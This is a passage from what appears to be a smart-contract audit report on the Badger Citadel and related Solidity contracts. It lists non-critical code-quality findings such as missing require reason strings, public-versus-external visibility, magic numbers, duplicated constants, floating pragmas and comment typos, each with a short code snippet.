statements should have descriptive reason strings\r\n\r\n1. File: external/MedianOracle.sol (line [68](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L68))\r\n```solidity\r\n        require(reportExpirationTimeSec_ <= MAX_REPORT_EXPIRATION_TIME);\r\n```\r\n2. File: external/MedianOracle.sol (line [69](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L69))\r\n```solidity\r\n        require(minimumProviders_ > 0);\r\n```\r\n3. File: external/MedianOracle.sol (line [84](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L84))\r\n```solidity\r\n        require(reportExpirationTimeSec_ <= MAX_REPORT_EXPIRATION_TIME);\r\n```\r\n4. File: external/MedianOracle.sol (line [109](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L109))\r\n```solidity\r\n        require(minimumProviders_ > 0);\r\n```\r\n5. File: external/MedianOracle.sol (line [123](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L123))\r\n```solidity\r\n        require(timestamps[0] > 0);\r\n```\r\n6. File: external/MedianOracle.sol (line [129](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L129))\r\n```solidity\r\n        require(timestamps[index_recent].add(reportDelaySec) <= now);\r\n```\r\n7. File: external/MedianOracle.sol (line [143](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L143))\r\n```solidity\r\n        require (providerReports[providerAddress][0].timestamp > 0);\r\n```\r\n8. File: external/MedianOracle.sol (line [211](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L211))\r\n```solidity\r\n        require(providerReports[provider][0].timestamp == 0);\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [126](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L126))\r\n```solidity\r\n        require(_stakingToken != address(0)); // dev: _stakingToken address should not be zero\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [163](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L163))\r\n```solidity\r\n        require(rewardData[_rewardsToken].lastUpdateTime == 0);\r\n```\r\n11. File: external/StakedCitadelLocker.sol (line [178](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L178))\r\n```solidity\r\n        require(rewardData[_rewardsToken].lastUpdateTime > 0);\r\n```\r\n12. File: external/StakedCitadelLocker.sol (line [812](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L812))\r\n```solidity\r\n        require(rewardDistributors[_rewardsToken][msg.sender]);\r\n```\r\n13. File: src/lib/GlobalAccessControlManaged.sol (line [81](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L81))\r\n```solidity\r\n        require(gac.hasRole(PAUSER_ROLE, msg.sender));\r\n```\r\n14. File: src/lib/GlobalAccessControlManaged.sol (line [86](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L86))\r\n```solidity\r\n        require(gac.hasRole(UNPAUSER_ROLE, msg.sender));\r\n```\r\n15. File: src/StakedCitadel.sol (line [180](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L180))\r\n```solidity\r\n        require(_token != address(0)); // dev: _token address should not be zero\r\n```\r\n16. File: src/StakedCitadel.sol (line [181](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L181))\r\n```solidity\r\n        require(_governance != address(0)); // dev: _governance address should not be zero\r\n```\r\n17. File: src/StakedCitadel.sol (line [182](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L182))\r\n```solidity\r\n        require(_keeper != address(0)); // dev: _keeper address should not be zero\r\n```\r\n18. File: src/StakedCitadel.sol (line [183](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L183))\r\n```solidity\r\n        require(_guardian != address(0)); // dev: _guardian address should not be zero\r\n```\r\n19. File: src/StakedCitadel.sol (line [184](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L184))\r\n```solidity\r\n        require(_treasury != address(0)); // dev: _treasury address should not be zero\r\n```\r\n20. File: src/StakedCitadel.sol (line [185](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L185))\r\n```solidity\r\n        require(_strategist != address(0)); // dev: _strategist address should not be zero\r\n```\r\n21. File: src/StakedCitadel.sol (line [186](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L186))\r\n```solidity\r\n        require(_badgerTree != address(0)); // dev: _badgerTree address should not be zero\r\n```\r\n22. File: src/StakedCitadel.sol (line [187](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L187))\r\n```solidity\r\n        require(_vesting != address(0)); // dev: _vesting address should not be zero\r\n```\r\n\r\n### `public` functions not called by the contract should be declared `external` instead\r\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\r\n\r\n1. File: external/StakedCitadelLocker.sol (lines [121-125](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L121-L125))\r\n```solidity\r\n    function initialize(\r\n        address _stakingToken,\r\n        string calldata name,\r\n        string calldata symbol\r\n    ) public initializer {\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [142](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L142))\r\n```solidity\r\n    function decimals() public view returns (uint8) {\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [145](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L145))\r\n```solidity\r\n    function name() public view returns (string memory) {\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [148](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L148))\r\n```solidity\r\n    function symbol() public view returns (string memory) {\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [151](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L151))\r\n```solidity\r\n    function version() public view returns(uint256){\r\n```\r\n6. File: external/StakedCitadelLocker.sol (lines [158-162](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L158-L162))\r\n```solidity\r\n    function addReward(\r\n        address _rewardsToken,\r\n        address _distributor,\r\n        bool _useBoost\r\n    ) public onlyOwner {\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [250](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L250))\r\n```solidity\r\n    function lastTimeRewardApplicable(address _rewardsToken) public view returns(uint256) {\r\n```\r\n8. File: src/CitadelToken.sol (lines [22-26](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelToken.sol#L22-L26))\r\n```solidity\r\n    function initialize(\r\n        string memory _name,\r\n        string memory _symbol,\r\n        address _gac\r\n    ) public initializer {\r\n```\r\n9. File: src/Funding.sol (line [223](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L223))\r\n```solidity\r\n    function getStakedCitadelAmountOut(uint256 _assetAmountIn) public view returns (uint256 xCitadelAmount_) {\r\n```\r\n10. File: src/lib/GlobalAccessControlManaged.sol (lines [27-29](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L27-L29))\r\n```solidity\r\n    function __GlobalAccessControlManaged_init(address _globalAccessControl)\r\n        public\r\n        onlyInitializing\r\n```\r\n11. File: src/lib/SettAccessControl.sol (line [51](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SettAccessControl.sol#L51))\r\n```solidity\r\n    function setGovernance(address _governance) public {\r\n```\r\n12. File: src/StakedCitadel.sol (lines [167-179](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L167-L179))\r\n```solidity\r\n    function initialize(\r\n        address _token,\r\n        address _governance,\r\n        address _keeper,\r\n        address _guardian,\r\n        address _treasury,\r\n        address _strategist,\r\n        address _badgerTree,\r\n        address _vesting,\r\n        string memory _name,\r\n        string memory _symbol,\r\n        uint256[4] memory _feeConfig\r\n    ) public initializer whenNotPaused {\r\n```\r\n13. File: src/StakedCitadel.sol (line [284](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L284))\r\n```solidity\r\n    function getPricePerFullShare() public view returns (uint256) {\r\n```\r\n14. File: src/SupplySchedule.sol (line [43](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L43))\r\n```solidity\r\n    function initialize(address _gac) public initializer {\r\n```\r\n15. File: src/SupplySchedule.sol (line [79](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L79))\r\n```solidity\r\n    function getEmissionsForCurrentEpoch() public view returns (uint256) {\r\n```\r\n\r\n### `constant`s should be defined rather than using magic numbers\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [131](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L131))\r\n```solidity\r\n        _decimals = 18;\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [201](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L201))\r\n```solidity\r\n        require(_max < 1500, \"over max payment\"); //max 15%\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [202](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L202))\r\n```solidity\r\n        require(_rate < 30000, \"over max rate\"); //max 3x\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [211](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L211))\r\n```solidity\r\n        require(_rate <= 500, \"over max rate\"); //max 5% per epoch\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [232](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L232))\r\n```solidity\r\n                rewardData[_rewardsToken].rewardRate).mul(1e18).div(rewardData[_rewardsToken].useBoost ? boostedSupply : lockedSupply)\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [243](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L243))\r\n```solidity\r\n        ).div(1e18).add(rewards[_user][_rewardsToken]);\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [428](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L428))\r\n```solidity\r\n        for (uint256 i = 0; i < 128; i++) {\r\n```\r\n8. File: src/CitadelMinter.sol (line [272](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L272))\r\n```solidity\r\n            require(_weight <= 10000, \"exceed max funding pool weight\");\r\n```\r\n9. File: src/StakedCitadel.sol (line [178](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L178))\r\n```solidity\r\n        uint256[4] memory _feeConfig\r\n```\r\n10. File: src/StakedCitadel.sol (line [203](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L203))\r\n```solidity\r\n            _feeConfig[3] <= MANAGEMENT_FEE_HARD_CAP,\r\n```\r\n11. File: src/StakedCitadel.sol (line [250](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L250))\r\n```solidity\r\n        managementFee = _feeConfig[3];\r\n```\r\n12. File: src/StakedCitadel.sol (line [255](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L255))\r\n```solidity\r\n        toEarnBps = 9_500; // initial value of toEarnBps // 95% is invested to the strategy, 5% for cheap withdrawals\r\n```\r\n13. File: src/SupplySchedule.sol (line [170](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L170))\r\n```solidity\r\n        epochRate[0] = 593962000000000000000000 / epochLength;\r\n```\r\n14. File: src/SupplySchedule.sol (line [171](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L171))\r\n```solidity\r\n        epochRate[1] = 591445000000000000000000 / epochLength;\r\n```\r\n15. File: src/SupplySchedule.sol (line [172](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L172))\r\n```solidity\r\n        epochRate[2] = 585021000000000000000000 / epochLength;\r\n```\r\n16. File: src/SupplySchedule.sol (line [173](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L173))\r\n```solidity\r\n        epochRate[3] = 574138000000000000000000 / epochLength;\r\n```\r\n17. File: src/SupplySchedule.sol (line [173](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L173))\r\n```solidity\r\n        epochRate[3] = 574138000000000000000000 / epochLength;\r\n```\r\n18. File: src/SupplySchedule.sol (line [174](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L174))\r\n```solidity\r\n        epochRate[4] = 558275000000000000000000 / epochLength;\r\n```\r\n19. File: src/SupplySchedule.sol (line [174](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L174))\r\n```solidity\r\n        epochRate[4] = 558275000000000000000000 / epochLength;\r\n```\r\n20. File: src/SupplySchedule.sol (line [175](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L175))\r\n```solidity\r\n        epochRate[5] = 536986000000000000000000 / epochLength;\r\n```\r\n21. File: src/SupplySchedule.sol (line [175](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L175))\r\n```solidity\r\n        epochRate[5] = 536986000000000000000000 / epochLength;\r\n```\r\n\r\n### Numeric values having to do with time should use time units for readability\r\nThere are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [70](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L70))\r\n```solidity\r\n    uint256 public constant rewardsDuration = 86400; // 1 day\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [70](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L70))\r\n```solidity\r\n    uint256 public constant rewardsDuration = 86400; // 1 day\r\n```\r\n3. File: src/StakedCitadelVester.sol (line [34](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L34))\r\n```solidity\r\n    uint256 public constant INITIAL_VESTING_DURATION = 86400 * 21; // 21 days of vesting\r\n```\r\n4. File: src/StakedCitadelVester.sol (line [34](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L34))\r\n```solidity\r\n    uint256 public constant INITIAL_VESTING_DURATION = 86400 * 21; // 21 days of vesting\r\n```\r\n\r\n### Constant redefined elsewhere\r\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated\r\n\r\n1. File: src/Funding.sol (lines [21-22](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L21-L22))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\nseen in src/CitadelMinter.sol\r\n\r\n2. File: src/Funding.sol (lines [23-24](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L23-L24))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\nseen in src/CitadelMinter.sol\r\n\r\n3. File: src/GlobalAccessControl.sol (lines [25-26](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L25-L26))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\nseen in src/Funding.sol\r\n\r\n4. File: src/GlobalAccessControl.sol (lines [32-33](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L32-L33))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\nseen in src/Funding.sol\r\n\r\n5. File: src/GlobalAccessControl.sol (lines [34-35](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L34-L35))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE =\r\n        keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\nseen in src/Funding.sol\r\n\r\n6. File: src/GlobalAccessControl.sol (line [37](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L37))\r\n```solidity\r\n    bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\r\n```\r\nseen in src/Funding.sol\r\n\r\n7. File: src/GlobalAccessControl.sol (lines [46-47](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L46-L47))\r\n```solidity\r\n    bytes32 public constant CITADEL_MINTER_ROLE =\r\n        keccak256(\"CITADEL_MINTER_ROLE\");\r\n```\r\nseen in src/CitadelToken.sol\r\n\r\n8. File: src/KnightingRound.sol (lines [19-20](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L19-L20))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\nseen in src/GlobalAccessControl.sol\r\n\r\n9. File: src/KnightingRound.sol (lines [21-22](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L21-L22))\r\n```solidity\r\n    bytes32 public constant TREASURY_GOVERNANCE_ROLE =\r\n        keccak256(\"TREASURY_GOVERNANCE_ROLE\");\r\n```\r\nseen in src/GlobalAccessControl.sol\r\n\r\n10. File: src/KnightingRound.sol (lines [24-25](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L24-L25))\r\n```solidity\r\n    bytes32 public constant TECH_OPERATIONS_ROLE =\r\n        keccak256(\"TECH_OPERATIONS_ROLE\");\r\n```\r\nseen in src/GlobalAccessControl.sol\r\n\r\n11. File: src/KnightingRound.sol (lines [26-27](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L26-L27))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE =\r\n        keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\nseen in src/GlobalAccessControl.sol\r\n\r\n12. File: src/lib/GlobalAccessControlManaged.sol (line [15](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L15))\r\n```solidity\r\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\r\n```\r\nseen in src/GlobalAccessControl.sol\r\n\r\n13. File: src/lib/GlobalAccessControlManaged.sol (line [16](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L16))\r\n```solidity\r\n    bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\r\n```\r\nseen in src/GlobalAccessControl.sol\r\n\r\n14. File: src/StakedCitadel.sol (line [112](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L112))\r\n```solidity\r\n    uint256 public constant MAX_BPS = 10_000;\r\n```\r\nseen in src/Funding.sol\r\n\r\n15. File: src/StakedCitadelVester.sol (lines [20-21](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L20-L21))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\nseen in src/KnightingRound.sol\r\n\r\n16. File: src/SupplySchedule.sol (lines [22-23](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L22-L23))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\nseen in src/StakedCitadelVester.sol\r\n\r\n\r\n### Non-library/interface files should use fixed compiler versions, not floating ones\r\n\r\n1. File: src/CitadelToken.sol (line [2](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelToken.sol#L2))\r\n```solidity\r\npragma solidity ^0.8.0;\r\n```\r\n2. File: src/GlobalAccessControl.sol (line [3](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L3))\r\n```solidity\r\npragma solidity ^0.8.0;\r\n```\r\n3. File: src/lib/GlobalAccessControlManaged.sol (line [3](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L3))\r\n```solidity\r\npragma solidity ^0.8.12;\r\n```\r\n\r\n### Typos\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [300](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L300))\r\n```solidity\r\n                //stop now as no futher checks are needed\r\n```\r\nfuther\r\n\r\n2. File: src/CitadelMinter.sol (line [102](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L102))\r\n```solidity\r\n     * @dev this contract is intended to be the only way citadel is minted, with the expection of the initial minting event\r\n```\r\nexpection\r\n\r\n3. File: src/Funding.sol (line [289](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L289))\r\n```solidity\r\n     * @param _assetCap New max cumulatiive amountIn\r\n```\r\ncumulatiive\r\n\r\n4. File: src/Funding.sol (line [333](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L333))\r\n```solidity\r\n    /// @dev We let assets accumulate and batch transfer to treasury (rather than transfer atomically on each deposi)t for user gas savings\r\n```\r\ndeposi)t\r\n\r\n5. File: src/KnightingRound.sol (line [342](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L342))\r\n```solidity\r\n     * @notice Update the `tokenIn` receipient address. Can only be called by owner\r\n```\r\nreceipient\r\n\r\n6. File: src/lib/GlobalAccessControlManaged.sol (line [24](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L24))\r\n```solidity\r\n     * @dev this is assumed to be used in the initializer of the inhereiting contract\r\n```\r\ninhereiting\r\n\r\n7. File: src/lib/GlobalAccessControlManaged.sol (line [60](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L60))\r\n```solidity\r\n    // @dev used to faciliate extra contract-specific permissioned accounts\r\n```\r\nfaciliate\r\n\r\n8. File: src/StakedCitadel.sol (line [81](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadel.sol#L81))\r\n```solidity\r\n    address public badgerTree; // Address we send tokens too via reportAdditionalTokens\r\n```\r\ntoo -> to\r\n\r\n\r\n### File does not contain an SPDX Identifier\r\n\r\n1. File: external/MedianOracle.sol (line [0](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L0))\r\n```solidity\r\npragma solidity 0.4.24;\r\n```\r\n\r\n### File is missing NatSpec\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [0](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n2. File: src/interfaces/badger/IBadgerGuestlist.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/badger/IBadgerGuestlist.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n3. File: src/interfaces/badger/IBadgerVipGuestlist.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/badger/IBadgerVipGuestlist.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n4. File: src/interfaces/badger/IEmptyStrategy.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/badger/IEmptyStrategy.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n5. File: src/interfaces/badger/IStrategy.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/badger/IStrategy.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n6. File: src/interfaces/badger/IVault.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/badger/IVault.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n7. File: 